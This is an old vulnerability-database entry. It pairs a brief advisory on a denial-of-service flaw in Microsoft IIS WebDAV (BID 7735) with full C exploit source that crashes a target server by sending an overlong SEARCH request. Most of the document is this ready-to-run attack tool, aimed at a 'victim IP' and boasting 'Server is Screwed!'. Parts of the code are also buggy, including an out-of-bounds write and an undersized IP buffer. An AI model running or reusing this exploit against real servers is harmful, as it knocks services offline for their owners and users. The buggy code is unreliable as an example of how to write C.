source: http://www.securityfocus.com/bid/7735/info

Microsoft Internet Information Services has been reported vulnerable to a denial of service.

When WebDAV receives excessively long requests to the 'PROPFIND' or 'SEARCH' variables, the IIS service will fail. All current web, FTP, and email sessions will be terminated.

IIS will automatically restart and normal service will resume.

** It has been reported that if a WebDAV request with a certain number of bytes is received, the Inetinfo service will remain alive but cease serving requests. This will cause the IIS server to stop serving requests until the service is manually restarted.

/*
IIS eXploit. by velan. Greetz to: Shashank Pandey a.k.a +(Neo1)+
Bid:  7735
*/

#define ERROR -1
#define OK 1

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>

int check_for_iis();
void screw_iis();
void usage();

char IP[15];

int main(int argc, char *argv[])
{
/*  cout << "Hello, World!" << endl;  */

   if(argc !=2)
   {
      usage();  exit(0);
   }

   printf("IIS eXploit. by velan. Greetz to: Shashank Pandey a.k.a +(Neo1)+\n");

   strcpy(IP, argv[1]);

   if(check_for_iis() != OK)
   {
      printf("Sorry, BAD LUCK! \n");    exit(0);
   }

   screw_iis();

  return EXIT_SUCCESS;
}

int check_for_iis()
{
  int sck, flag = 1;
  struct sockaddr_in sin;
  char req[50];

  sck = socket(AF_INET, SOCK_STREAM, 0);
  if(sck == ERROR)
  {
    perror("Socket error ");      exit(0);
  }

  sin.sin_port = htons(80);
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = inet_addr(IP);

  if ((connect(sck, (struct sockaddr *) &sin, sizeof(sin))) == -1)
  {
    perror("Connect Error ");     exit(0);
  }

  strcpy(req, "GET / HTTP/1.0\r\n\n");
  send(sck, req, sizeof(req), 0);
  recv(sck, req, sizeof(req), 0);

  if (strstr(req,"IIS") == NULL)
  {
    printf(" Not an IIS server! \n");
    flag = 0;
  }

  sprintf(req,"SEARCH / HTTP/1.0\r\n\n",40);
  send(sck, req, sizeof(req), 0);
  recv(sck, req, sizeof(req), 0);

  if (strstr(req,"HTTP/1.1 411 Length Required") == NULL)
  {
    printf("METHOD SEARCH NOT ALLOWED. \n");
    flag = 0;
  }

  return(flag);
}



void screw_iis()
{
  int sck, flag = 1;
  struct sockaddr_in sin;
  char junk[100];
  char buffer[65535] ="";
  char request[80000];
  char content[] =
           "<?xml version=\"1.0\"?>\r\n"
           "<g:searchrequest xmlns:g=\"DAV:\">\r\n"
           "<g:sql>\r\n"
           "Select \"DAV:displayname\" from scope()\r\n"
           "</g:sql>\r\n"
           "</g:searchrequest>\r\n";


  sck = socket(AF_INET, SOCK_STREAM, 0);
  if(sck == ERROR)
  {
    perror("Socket error ");      exit(0);
  }

  sin.sin_port = htons(80);
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = inet_addr(IP);

  if ((connect(sck, (struct sockaddr *) &sin, sizeof(sin))) == -1)
  {
    perror("Connect Error ");     exit(0);
  }

  buffer[sizeof(buffer)]=0x00;

  memset(buffer,'S',sizeof(buffer));
  memset(request,0,sizeof(request));
  memset(junk,0,sizeof(junk));

  sprintf(request,"SEARCH /%s HTTP/1.1\r\nHost: %s\r\nContent-type: text/xml\r\nCon
tent-Length: ",buffer,IP);
  sprintf(request,"%s%d\r\n\r\n",request,strlen(content));

  printf("\r\nScrewing the server... \n");

  send(sck,request,strlen(request),0);

  send(sck,content,strlen(content),0);

  recv(sck,junk,sizeof(junk),0);

  if(junk[0]==0x00)
  {
     printf("Server is Screwed! \r\n");
  }
  else
  {
      printf("BAD LUCK. Patched.\n");
  }
}



void usage()
{
  printf("IIS eXploit. by velan. Greetz to: Shashank Pandey a.k.a +(Neo1)+\n");
  printf("Usage\r\n");
  printf("Screw_IIS <victim IP>\n");
}
